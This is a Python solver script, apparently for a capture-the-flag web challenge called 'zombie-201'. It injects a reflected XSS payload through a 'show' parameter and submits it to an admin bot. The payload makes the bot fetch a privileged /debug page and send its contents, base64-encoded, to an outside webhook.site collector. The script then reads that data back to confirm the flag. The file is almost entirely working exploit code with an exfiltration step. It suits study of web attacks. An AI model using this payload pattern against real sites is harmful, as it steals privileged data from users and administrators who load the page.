import base64
from pathlib import Path
import requests
import sys
import time
import urllib.parse

CHAL_URL = 'https://zombie-201-tlejfksioa-ul.a.run.app'

# goto https://webhook.site/ and it'll assign you a free token
with open(Path(__file__).with_name('hook-token.txt'), 'r') as file:
    HOOK_TOKEN = file.read().replace('\n', '')

HOOK_URL = f'https://webhook.site/{HOOK_TOKEN}'
HOOK_DELETE_URL = f'https://webhook.site/token/{HOOK_TOKEN}/request'
HOOK_READ_URL = f'https://webhook.site/token/{HOOK_TOKEN}/request/latest'

with open(Path(__file__).with_name('flag-prefix.txt'), 'r') as file:
    FLAG_PREFIX = file.read().replace('\n', '')


def clearHookSite():
    response = requests.delete(HOOK_DELETE_URL)
    if response.status_code != 200:
        print('error deleting hook site, status code: ', response.status_code)
        sys.exit(1)

def getLastHookRequest():
    for retry in range(0, 5):
        time.sleep(1)
        response = requests.get(HOOK_READ_URL)
        if response.status_code != 200:
            continue

        return response.json()

    print('error reading hook request')
    sys.exit(1)

def solve():
    clearHookSite()

    script = f"<script>fetch('{CHAL_URL}/debug').then(response=>response.text()).then(data=>fetch('{HOOK_URL}?data='+btoa(data)))</script>"
    urlToSubmit = f"{CHAL_URL}/zombie?show={urllib.parse.quote(script)}"
    visitUrl = f"{CHAL_URL}/visit?url={urllib.parse.quote(urlToSubmit)}"

    response = requests.get(visitUrl)

    if response.status_code != 200:
        print('error submitting url, status code: ', response.status_code)
        sys.exit(1)

    if 'admin bot has visited your url' not in response.text:
        print('error submitting url, unexpected response: ', response.text)
        sys.exit(1)

    hookJson = getLastHookRequest()
    hookQuery = hookJson.get('query')
    hookDataB64 = hookQuery.get('data')
    hookDebugData = base64.b64decode(hookDataB64).decode()

    if FLAG_PREFIX not in hookDebugData:
        print('error, flag not found: ', hookDebugData)
        sys.exit(1)

    print('zombie-201 solved')

solve()
